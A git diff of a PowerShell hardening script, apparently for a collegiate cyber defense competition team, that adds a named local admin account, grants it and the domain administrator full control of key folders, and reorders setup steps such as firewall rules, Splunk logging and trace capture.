-        Set-Acl $ccdcpath $Acl
+    $paths = @(
+    "C:\Program Files",
+    "C:\Program Files (x86)",
+    "C:\Users",
+    "C:\ccdc"
+)
+                    #Add local Admin account
+    
+    If ($curhost -ne "WinServer"){
+        Write-host "Adding localblue Account"
+        if( $Password -eq $null){
+            $Password = Read-Host "Password for local admin:" -AsSecureString
+        }else{$Password = ConvertTo-SecureString -AsPlainText $Password -Force}
+        New-LocalUser -Name "localblue" -Password $Password
+        Add-LocalGroupMember -Group "Administrators" -Member "localblue"
+        foreach ($path in $paths) {
+            icacls $path /grant "localblue:(OI)(CI)F" /T /C
+        }
+        icacls "C:\Windows" /grant "localblue:(OI)(CI)RX"
     }
-    $Acl = Get-Acl $ccdcpath
-    $ar2 = New-Object system.security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM","Read",,,"Allow")
-    $Acl.RemoveAccessRuleAll($ar2)
-    Set-Acl $ccdcpath -AclObject $Acl
-    $Acl = Get-Acl $ccdcpath
-    $ar3 = New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators", "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
-    $Acl.RemoveAccessRuleAll($ar3)
-    Set-Acl $ccdcpath -AclObject $Acl
-    icacls $ccdcpath /remove:g "Authenticated Users" 
-    icacls $ccdcpath /remove:g "Users" 
-    icacls $ccdcpath\* /inheritance:e
-    icacls C:\ccdc\pfirewall.log /grant $env:username:F Administrators:F
+    $script:dname= (Get-CimInstance Win32_ComputerSystem).Domain
+    foreach ($path in $paths) {
+        icacls $path /grant:r "$dname\administrator:(OI)(CI)F" /T /C
+    }
+    icacls "C:\Windows" /grant "$dname\administrator:(OI)(CI)RX"  
    # Continue_
 }
 
@@ -716,7 +733,12 @@ If (!($curRoll)){
     Start-Sleep -s 2
     Exit
 }
-                # 2. Team Check
+                
+
+
+
+
+                # 3. Team Check
 Do{
     cls               
     $teamNum = Read-Host "Please enter your team number (1-12)"
@@ -730,7 +752,7 @@ Do{
     
 
 
-                # 3. Host Check
+                # 4. Host Check
 If($curhost -eq $null){
     Do{
         cls
@@ -763,8 +785,12 @@ switch ($curhost) {
     7 {$curhost = "FTP Server"; Set_Internal_IPs}
     8 {$curhost = "Web Server"; Set_Internal_IPs}
 }
+                # 2. Change Access Controls
+CCDC_ICACLS
 
-                # 4. Setting CCDC directories
+                # 5. Setting CCDC directories
+
+
 CCDC_Directories
 
 Scan_Dirs
@@ -774,34 +800,21 @@ Discovery_
 #Moved into host check (External in Team Check)
 
                 # 6. Domain Name 
-if($dname -eq $null){
-    Do{
-        cls               
-        Write-Host "What is your domain name? Example:  DOMAIN.COM" -ForegroundColor Cyan
-        $dName = Read-Host "Domain Name"
-        cls
-        Write-Host "Domain Name: $dName"  -ForegroundColor Yellow
-        $domainanswer = Read-Host "Is this Information correct?  Y/N"
-    }Until (($domainanswer -eq "Y") -or ($domainanswer -eq "y"))
-}
+#if($dname -eq $null){
+ #   Do{
+  #      cls               
+   #     Write-Host "What is your domain name? Example:  DOMAIN.COM" -ForegroundColor Cyan
+    #    $dName = Read-Host "Domain Name"
+     #   cls
+      #  Write-Host "Domain Name: $dName"  -ForegroundColor Yellow
+      #  $domainanswer = Read-Host "Is this Information correct?  Y/N"
+    #}Until (($domainanswer -eq "Y") -or ($domainanswer -eq "y"))
+#}
 
                 # 7. Generic firewall rules, includes Disable IPv6 Teredo tunneling. 
 Bulk_Firewall
 
-                # 8. Set splunk loggin firewall rules
-Splunk_Logging
-
-Write-Host "Starting trace..."
-netsh trace start capture=YES tracefile=$ccdcpath\day1.etl | Out-Null
-#Continue_
-
-                # 9. run function Damage_Reversal
-Damage_Reversal
-
-                # 10. Setup TCPDump
-# Removed
-
-                # 11. Apply Box specific rules
+                # 8. Apply Box specific rules
 switch -Wildcard ($curhost) {
     "WinServer*" {Winserver}
     "External Win10" {Win10}
@@ -810,10 +823,21 @@ switch -Wildcard ($curhost) {
     "Web Server" {WinWeb}
     "FTP Server" {WinFTP}
 }
+                # 9. Set splunk loggin firewall rules
+Splunk_Logging
 
+Write-Host "Starting trace..."
+netsh trace start capture=YES tracefile=$ccdcpath\day1.etl | Out-Null
+#Continue_
+
+                # 10. run function Damage_Reversal
+Damage_Reversal
+
+                # 11. Setup TCPDump
+# Removed
 
                 # 12. Tighten CCDC ACLs
-CCDC_ICACLS
+
 
                 # 13. Config_NTP_Server
 # Removed
